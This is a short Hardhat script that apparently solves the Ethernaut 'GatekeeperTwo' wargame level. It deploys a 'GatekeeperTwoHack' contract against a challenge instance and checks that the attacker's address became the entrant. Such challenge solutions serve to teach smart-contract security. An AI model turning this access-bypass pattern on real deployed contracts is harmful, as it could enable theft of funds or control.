const hre = require("hardhat");

async function main() {
  const [stealer] = await hre.ethers.getSigners();
  const gateKeeperInstanceAddr = "0xF6ae5F0361902D03b85f1168aDB9fDEfD99eB056";
  const GatekeeperTwo = await hre.ethers.getContractFactory("GatekeeperTwo");
  const gateKeeperInstance = await GatekeeperTwo.attach(gateKeeperInstanceAddr);

  const GateKeeperHack = await hre.ethers.getContractFactory("GatekeeperTwoHack");
  const gateKeeperHack = await GateKeeperHack.deploy(gateKeeperInstance.address);
  await gateKeeperHack.deployed();

  const entrant = await gateKeeperInstance.entrant();
  console.log("Successfully entered:", entrant.toString() === stealer.address.toString());
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
